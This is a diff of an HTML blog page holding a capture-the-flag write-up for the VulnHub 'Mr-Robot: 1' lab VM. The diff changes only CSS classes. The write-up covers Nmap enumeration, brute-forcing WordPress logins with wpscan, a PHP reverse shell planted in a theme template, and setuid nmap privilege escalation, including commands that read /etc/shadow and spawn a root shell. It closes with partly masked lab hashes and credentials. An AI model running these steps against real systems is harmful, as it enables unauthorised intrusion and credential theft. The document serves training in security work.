@@ -27,16 +27,16 @@
         <p style="float:right;">🔖 tagged <a href=/tags.html#vulnhub>vulnhub</a> and <a href=/tags.html#writeup>writeup</a></p>
     <div style="clear:both;"></div>
     <hr><h2 class="h2 collapsible" onclick="toggle(this);">Overview</h2>
-<p class="nested">This is a writeup for VulnHub VM <a href="https://www.vulnhub.com/entry/mr-robot-1,151/">Mr-Robot: 1</a>. Here are stats for this machine from <a href="https://github.com/7h3rAm/machinescli">machinescli</a>:</p>
-<p class="nested"><img alt="writeup.overview.machinescli" src="/static/files/posts_vulnhub_mrrobot1/machinescli.png.webp" /></p>
+<p class="nested active">This is a writeup for VulnHub VM <a href="https://www.vulnhub.com/entry/mr-robot-1,151/">Mr-Robot: 1</a>. Here are stats for this machine from <a href="https://github.com/7h3rAm/machinescli">machinescli</a>:</p>
+<p class="nested active"><img alt="writeup.overview.machinescli" src="/static/files/posts_vulnhub_mrrobot1/machinescli.png.webp" /></p>
 <h3 class="h3 collapsible" onclick="toggle(this);">Killchain</h3>
-<p class="nested">Here's the killchain (<code>enumeration</code> → <code>exploitation</code> → <code>privilege escalation</code>) for this machine:</p>
-<p class="nested"><img alt="writeup.overview.killchain" src="/static/files/posts_vulnhub_mrrobot1/killchain.png.webp" /></p>
+<p class="nested active">Here's the killchain (<code>enumeration</code> → <code>exploitation</code> → <code>privilege escalation</code>) for this machine:</p>
+<p class="nested active"><img alt="writeup.overview.killchain" src="/static/files/posts_vulnhub_mrrobot1/killchain.png.webp" /></p>
 <h3 class="h3 collapsible" onclick="toggle(this);">TTPs</h3>
-<p class="nested">1. <code>80/tcp/http/Apache httpd</code>: <a href="https://github.com/7h3rAm/writeups#exploit_php_reverseshell">exploit_php_reverseshell</a>, <a href="https://github.com/7h3rAm/writeups#privesc_setuid">privesc_setuid</a>, <a href="https://github.com/7h3rAm/writeups#privesc_nmap">privesc_nmap</a>  </p>
+<p class="nested active">1. <code>80/tcp/http/Apache httpd</code>: <a href="https://github.com/7h3rAm/writeups#exploit_php_reverseshell">exploit_php_reverseshell</a>, <a href="https://github.com/7h3rAm/writeups#privesc_setuid">privesc_setuid</a>, <a href="https://github.com/7h3rAm/writeups#privesc_nmap">privesc_nmap</a>  </p>
 <hr><h2 class="h2 collapsible" onclick="toggle(this);">Phase #1: Enumeration</h2>
-<p class="nested">1. Here's the Nmap scan result:  </p>
-<pre class="nested"><code># Nmap 7.70 scan initiated Thu Oct 17 15:46:57 2019 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /root/toolbox/writeups/vulnhub.mrrobot1/results/192.168.92.134/scans/_quick_tcp_nmap.txt -oX /root/toolbox/writeups/vulnhub.mrrobot1/results/192.168.92.134/scans/xml/_quick_tcp_nmap.xml 192.168.92.134
+<p class="nested active">1. Here's the Nmap scan result:  </p>
+<pre class="nested active"><code># Nmap 7.70 scan initiated Thu Oct 17 15:46:57 2019 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /root/toolbox/writeups/vulnhub.mrrobot1/results/192.168.92.134/scans/_quick_tcp_nmap.txt -oX /root/toolbox/writeups/vulnhub.mrrobot1/results/192.168.92.134/scans/xml/_quick_tcp_nmap.xml 192.168.92.134
 Nmap scan report for 192.168.92.134
 Host is up, received arp-response (0.00077s latency).
 Scanned at 2019-10-17 15:46:58 PDT for 22s
@@ -82,58 +82,58 @@ Read data files from: /usr/bin/../share/nmap
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 # Nmap done at Thu Oct 17 15:47:20 2019 -- 1 IP address (1 host up) scanned in 23.94 seconds
 </code></pre>
-<p class="nested">2. Here a summary of open ports and associated <a href="https://github.com/Tib3rius/AutoRecon">AutoRecon</a> scan files:</p>
-<p class="nested"><img alt="writeup.enumeration.steps.2.1" src="/static/files/posts_vulnhub_mrrobot1/openports.png.webp" />  </p>
-<p class="nested">3. We find 2 interesting entries within the <code>http://192.168.92.134/robots.txt</code> file. One of these is for the first of the 3 key files and the other entry points to what looks like a dictionary file:  </p>
-<pre class="nested"><code>http://192.168.92.134/robots.txt
+<p class="nested active">2. Here a summary of open ports and associated <a href="https://github.com/Tib3rius/AutoRecon">AutoRecon</a> scan files:</p>
+<p class="nested active"><img alt="writeup.enumeration.steps.2.1" src="/static/files/posts_vulnhub_mrrobot1/openports.png.webp" />  </p>
+<p class="nested active">3. We find 2 interesting entries within the <code>http://192.168.92.134/robots.txt</code> file. One of these is for the first of the 3 key files and the other entry points to what looks like a dictionary file:  </p>
+<pre class="nested active"><code>http://192.168.92.134/robots.txt
   http://192.168.92.134/fsocity.dic
   http://192.168.92.134/key-1-of-3.txt
 </code></pre>
-<p class="nested"><img alt="writeup.enumeration.steps.3.1" src="/static/files/posts_vulnhub_mrrobot1/screenshot01.png.webp" />  </p>
-<p class="nested"><img alt="writeup.enumeration.steps.3.2" src="/static/files/posts_vulnhub_mrrobot1/screenshot01a.png.webp" />  </p>
-<p class="nested">4. We download the dictionary file and trim its contents to have only unique entries. This reduced the count of possible passwords from <code>858160</code> to <code>11451</code>:  </p>
-<p class="nested"><img alt="writeup.enumeration.steps.4.1" src="/static/files/posts_vulnhub_mrrobot1/screenshot02.png.webp" />  </p>
-<p class="nested">5. From the <code>gobuster</code> scan, we also find entries pointing to a Wordpress installation. We confirm this by visiting the login page:  </p>
-<pre class="nested"><code>http://192.168.92.134/wp-login
+<p class="nested active"><img alt="writeup.enumeration.steps.3.1" src="/static/files/posts_vulnhub_mrrobot1/screenshot01.png.webp" />  </p>
+<p class="nested active"><img alt="writeup.enumeration.steps.3.2" src="/static/files/posts_vulnhub_mrrobot1/screenshot01a.png.webp" />  </p>
+<p class="nested active">4. We download the dictionary file and trim its contents to have only unique entries. This reduced the count of possible passwords from <code>858160</code> to <code>11451</code>:  </p>
+<p class="nested active"><img alt="writeup.enumeration.steps.4.1" src="/static/files/posts_vulnhub_mrrobot1/screenshot02.png.webp" />  </p>
+<p class="nested active">5. From the <code>gobuster</code> scan, we also find entries pointing to a Wordpress installation. We confirm this by visiting the login page:  </p>
+<pre class="nested active"><code>http://192.168.92.134/wp-login
 </code></pre>
-<p class="nested"><img alt="writeup.enumeration.steps.5.1" src="/static/files/posts_vulnhub_mrrobot1/screenshot03.png.webp" />  </p>
-<p class="nested">6. After trying a few credentials manually, we decide to bruteforce usernames first. We first need to create a usernames list from the <code>fsocity.dic</code> dictionary found earlier. For our case, we will filter on strings that are 4-8 chars long. Doing this, we eventually find 5247 possible candidates. We then bruteforce these strings and find a valid username:  </p>
-<pre class="nested"><code>grep -E '^[a-zA-Z]' fsocity.dic | sort -u |  awk 'length($1) &lt;=8 &amp;&amp; length($1) &gt;= 4 { print $1}' &gt; users
+<p class="nested active"><img alt="writeup.enumeration.steps.5.1" src="/static/files/posts_vulnhub_mrrobot1/screenshot03.png.webp" />  </p>
+<p class="nested active">6. After trying a few credentials manually, we decide to bruteforce usernames first. We first need to create a usernames list from the <code>fsocity.dic</code> dictionary found earlier. For our case, we will filter on strings that are 4-8 chars long. Doing this, we eventually find 5247 possible candidates. We then bruteforce these strings and find a valid username:  </p>
+<pre class="nested active"><code>grep -E '^[a-zA-Z]' fsocity.dic | sort -u |  awk 'length($1) &lt;=8 &amp;&amp; length($1) &gt;= 4 { print $1}' &gt; users
 wpuser http://192.168.92.134/ users
   Found valid username: elliot
   Found valid username: Elliot
   Found valid username: ELLIOT
 </code></pre>
-<p class="nested"><img alt="writeup.enumeration.steps.6.1" src="/static/files/posts_vulnhub_mrrobot1/screenshot04.png.webp" />  </p>
-<p class="nested"><img alt="writeup.enumeration.steps.6.2" src="/static/files/posts_vulnhub_mrrobot1/screenshot04a.png.webp" />  </p>
+<p class="nested active"><img alt="writeup.enumeration.steps.6.1" src="/static/files/posts_vulnhub_mrrobot1/screenshot04.png.webp" />  </p>
+<p class="nested active"><img alt="writeup.enumeration.steps.6.2" src="/static/files/posts_vulnhub_mrrobot1/screenshot04a.png.webp" />  </p>
 <h3 class="h3 collapsible" onclick="toggle(this);">Findings</h3>
 <h4 class="h4 collapsible" onclick="toggle(this);">Open Ports</h4>
-<pre class="nested"><code>80/tcp   |  http      |  Apache httpd
+<pre class="nested active"><code>80/tcp   |  http      |  Apache httpd
 443/tcp  |  ssl/http  |  Apache httpd
 </code></pre>
 <h4 class="h4 collapsible" onclick="toggle(this);">Files</h4>
-<pre class="nested"><code>http://192.168.92.134/robots.txt
+<pre class="nested active"><code>http://192.168.92.134/robots.txt
 http://192.168.92.134/key-1-of-3.txt
 </code></pre>
 <h4 class="h4 collapsible" onclick="toggle(this);">Users</h4>
-<pre class="nested"><code>wordpress: elliot
+<pre class="nested active"><code>wordpress: elliot
 </code></pre>
 <hr><h2 class="h2 collapsible" onclick="toggle(this);">Phase #2: Exploitation</h2>
-<p class="nested">1. We confirm that the username is indeed valid from Wordpress error message for incorrect password. We then use <code>wpscan</code> to bruteforce password for user <code>elliot</code> using the trimmed dictionary file and find a match:  </p>
-<pre class="nested"><code>wpscan --url http://192.168.92.134 -P fsocity.dic.trimmed -U elliot
+<p class="nested active">1. We confirm that the username is indeed valid from Wordpress error message for incorrect password. We then use <code>wpscan</code> to bruteforce password for user <code>elliot</code> using the trimmed dictionary file and find a match:  </p>
+<pre class="nested active"><code>wpscan --url http://192.168.92.134 -P fsocity.dic.trimmed -U elliot
   [i] Valid Combinations Found:
    | Username: elliot, Password: ER28-0652
 </code></pre>
-<p class="nested"><img alt="writeup.exploitation.steps.1.1" src="/static/files/posts_vulnhub_mrrobot1/screenshot05.png.webp" />  </p>
-<p class="nested"><img alt="writeup.exploitation.steps.1.2" src="/static/files/posts_vulnhub_mrrobot1/screenshot06.png.webp" />  </p>
-<p class="nested">2. We now authenticate as user <code>elliot</code> to the Wordpress installation and find that this user has administrative privileges. We can use these privileges to successfully upload a PHP reverse shell by modifying the <code>404.php</code> template and gain interactive access on the target system:  </p>
-<p class="nested"><img alt="writeup.exploitation.steps.2.1" src="/static/files/posts_vulnhub_mrrobot1/screenshot07.png.webp" />  </p>
-<p class="nested"><img alt="writeup.exploitation.steps.2.2" src="/static/files/posts_vulnhub_mrrobot1/screenshot07a.png.webp" />  </p>
-<p class="nested"><img alt="writeup.exploitation.steps.2.3" src="/static/files/posts_vulnhub_mrrobot1/screenshot07b.png.webp" />  </p>
-<p class="nested"><img alt="writeup.exploitation.steps.2.4" src="/static/files/posts_vulnhub_mrrobot1/screenshot07c.png.webp" />  </p>
-<p class="nested"><img alt="writeup.exploitation.steps.2.5" src="/static/files/posts_vulnhub_mrrobot1/screenshot07d.png.webp" />  </p>
+<p class="nested active"><img alt="writeup.exploitation.steps.1.1" src="/static/files/posts_vulnhub_mrrobot1/screenshot05.png.webp" />  </p>
+<p class="nested active"><img alt="writeup.exploitation.steps.1.2" src="/static/files/posts_vulnhub_mrrobot1/screenshot06.png.webp" />  </p>
+<p class="nested active">2. We now authenticate as user <code>elliot</code> to the Wordpress installation and find that this user has administrative privileges. We can use these privileges to successfully upload a PHP reverse shell by modifying the <code>404.php</code> template and gain interactive access on the target system:  </p>
+<p class="nested active"><img alt="writeup.exploitation.steps.2.1" src="/static/files/posts_vulnhub_mrrobot1/screenshot07.png.webp" />  </p>
+<p class="nested active"><img alt="writeup.exploitation.steps.2.2" src="/static/files/posts_vulnhub_mrrobot1/screenshot07a.png.webp" />  </p>
+<p class="nested active"><img alt="writeup.exploitation.steps.2.3" src="/static/files/posts_vulnhub_mrrobot1/screenshot07b.png.webp" />  </p>
+<p class="nested active"><img alt="writeup.exploitation.steps.2.4" src="/static/files/posts_vulnhub_mrrobot1/screenshot07c.png.webp" />  </p>
+<p class="nested active"><img alt="writeup.exploitation.steps.2.5" src="/static/files/posts_vulnhub_mrrobot1/screenshot07d.png.webp" />  </p>
 <hr><h2 class="h2 collapsible" onclick="toggle(this);">Phase #2.5: Post Exploitation</h2>
-<pre class="nested"><code>robot@linux&gt; id
+<pre class="nested active"><code>robot@linux&gt; id
 uid=1002(robot) gid=1002(robot) groups=1002(robot)
 robot@linux&gt;  
 robot@linux&gt; uname
@@ -157,47 +157,47 @@ mysql
 robot
 </code></pre>
 <hr><h2 class="h2 collapsible" onclick="toggle(this);">Phase #3: Privilege Escalation</h2>
-<p class="nested">1. While looking at the <code>/home/</code> directory we find that there is a directory for user <code>robot</code> and this user has access to the second key file <code>key-2-of-3.txt</code>. We have to switch user to access this key file and to do that we need user <code>robot</code>'s password. We also find a word-readable <code>password.raw-md5</code> file within this directory and use Google to find that it is the MD5 hash of the string <code>abcdefghijklmnopqrstuvwxyz</code>. We can now proceed and switch user:  </p>
-<pre class="nested"><code>cat /home/robot/password.raw-md5
+<p class="nested active">1. While looking at the <code>/home/</code> directory we find that there is a directory for user <code>robot</code> and this user has access to the second key file <code>key-2-of-3.txt</code>. We have to switch user to access this key file and to do that we need user <code>robot</code>'s password. We also find a word-readable <code>password.raw-md5</code> file within this directory and use Google to find that it is the MD5 hash of the string <code>abcdefghijklmnopqrstuvwxyz</code>. We can now proceed and switch user:  </p>
+<pre class="nested active"><code>cat /home/robot/password.raw-md5
   robot:c3fcd3d76192e4007dfb496cca67e13b
 su - robot
 cat /home/robot/key-2-of-3.txt
 </code></pre>
-<p class="nested"><img alt="writeup.privesc.steps.1.1" src="/static/files/posts_vulnhub_mrrobot1/screenshot08.png.webp" />  </p>
-<p class="nested"><img alt="writeup.privesc.steps.1.2" src="/static/files/posts_vulnhub_mrrobot1/screenshot08a.png.webp" />  </p>
-<p class="nested"><img alt="writeup.privesc.steps.1.3" src="/static/files/posts_vulnhub_mrrobot1/screenshot08b.png.webp" />  </p>
-<p class="nested">2. We find that the <code>nmap</code> binary on this system has <code>setuid</code> privileges. We can use this to gain elevated access:  </p>
-<pre class="nested"><code>find / -type f -perm -04000 2&gt;/dev/null
+<p class="nested active"><img alt="writeup.privesc.steps.1.1" src="/static/files/posts_vulnhub_mrrobot1/screenshot08.png.webp" />  </p>
+<p class="nested active"><img alt="writeup.privesc.steps.1.2" src="/static/files/posts_vulnhub_mrrobot1/screenshot08a.png.webp" />  </p>
+<p class="nested active"><img alt="writeup.privesc.steps.1.3" src="/static/files/posts_vulnhub_mrrobot1/screenshot08b.png.webp" />  </p>
+<p class="nested active">2. We find that the <code>nmap</code> binary on this system has <code>setuid</code> privileges. We can use this to gain elevated access:  </p>
+<pre class="nested active"><code>find / -type f -perm -04000 2&gt;/dev/null
 ls -la /usr/local/bin/nmap
 nmap --interactive
   !cat /etc/shadow
   !sh
 </code></pre>
-<p class="nested"><img alt="writeup.privesc.steps.2.1" src="/static/files/posts_vulnhub_mrrobot1/screenshot09.png.webp" />  </p>
-<p class="nested"><img alt="writeup.privesc.steps.2.2" src="/static/files/posts_vulnhub_mrrobot1/screenshot09a.png.webp" />  </p>
-<p class="nested"><img alt="writeup.privesc.steps.2.3" src="/static/files/posts_vulnhub_mrrobot1/screenshot09b.png.webp" />  </p>
-<p class="nested"><img alt="writeup.privesc.steps.2.4" src="/static/files/posts_vulnhub_mrrobot1/screenshot09c.png.webp" />  </p>
-<p class="nested">3. We can now read the <code>/root/key-3-of-3.txt</code> file to complete the challenge:  </p>
-<pre class="nested"><code>cat /root/key-3-of-3.txt
+<p class="nested active"><img alt="writeup.privesc.steps.2.1" src="/static/files/posts_vulnhub_mrrobot1/screenshot09.png.webp" />  </p>
+<p class="nested active"><img alt="writeup.privesc.steps.2.2" src="/static/files/posts_vulnhub_mrrobot1/screenshot09a.png.webp" />  </p>
+<p class="nested active"><img alt="writeup.privesc.steps.2.3" src="/static/files/posts_vulnhub_mrrobot1/screenshot09b.png.webp" />  </p>
+<p class="nested active"><img alt="writeup.privesc.steps.2.4" src="/static/files/posts_vulnhub_mrrobot1/screenshot09c.png.webp" />  </p>
+<p class="nested active">3. We can now read the <code>/root/key-3-of-3.txt</code> file to complete the challenge:  </p>
+<pre class="nested active"><code>cat /root/key-3-of-3.txt
 </code></pre>
-<p class="nested"><img alt="writeup.privesc.steps.3.1" src="/static/files/posts_vulnhub_mrrobot1/screenshot10.png.webp" />  </p>
+<p class="nested active"><img alt="writeup.privesc.steps.3.1" src="/static/files/posts_vulnhub_mrrobot1/screenshot10.png.webp" />  </p>
 <hr><h2 class="h2 collapsible" onclick="toggle(this);">Loot</h2>
 <h3 class="h3 collapsible" onclick="toggle(this);">Hashes</h3>
-<pre class="nested"><code>root:$6$9xQC1KOf$5cmONytt0VF/wi3Np3jZGRSVzpGj6sXxVHkyJLjV4edlBxTVmW91pcGwAViViSWcAS/.OF0iuvylU5Izn........................
+<pre class="nested active"><code>root:$6$9xQC1KOf$5cmONytt0VF/wi3Np3jZGRSVzpGj6sXxVHkyJLjV4edlBxTVmW91pcGwAViViSWcAS/.OF0iuvylU5Izn........................
 bitnamiftp:$6$saPiFTAH$7K09sg5oIfkIs5kuMx1R/Um4HNd8O6vF2n8oICEom8VVer0BYATY5wtzdPdP3JeuKbZ4RYBml0THNQv8.........................
 robot:$6$HmQCDKcM$mcINMrQFa0Qm7XaUaS5xLEBSeP3bUkr18iwgwTAL8AIfUDYBWG5L8J9.Ukb3gVWUQoYam4G0m.I5qaHBn........................
 </code></pre>
 <h3 class="h3 collapsible" onclick="toggle(this);">Credentials</h3>
-<pre class="nested"><code>ssh: robot/abcdefghijklmnopqrs.......
+<pre class="nested active"><code>ssh: robot/abcdefghijklmnopqrs.......
 wordpress: elliot/ER28-....
 </code></pre>
 <h3 class="h3 collapsible" onclick="toggle(this);">Flags</h3>
-<pre class="nested"><code>http://192.168.92.134/key-1-of-3.txt: 073403c8a58a1f80d9..............
+<pre class="nested active"><code>http://192.168.92.134/key-1-of-3.txt: 073403c8a58a1f80d9..............
 /home/robot/key-2-of-3.txt: 822c73956184f694993b............
 /root/key-3-of-3.txt: 04787ddef27c3dee1ee16...........
 </code></pre>
 <hr><h2 class="h2 collapsible" onclick="toggle(this);">References</h2>
-<ul class="nested">
+<ul class="nested active">
 <li><a href="https://www.vulnhub.com/entry/mr-robot-1,151/">https://www.vulnhub.com/entry/mr-robot-1,151/</a>  </li>
 <li><a href="http://f4l13n5n0w.github.io/blog/2016/08/10/vulnhub-mr-robot-1/">http://f4l13n5n0w.github.io/blog/2016/08/10/vulnhub-mr-robot-1/</a>  </li>
 </ul>
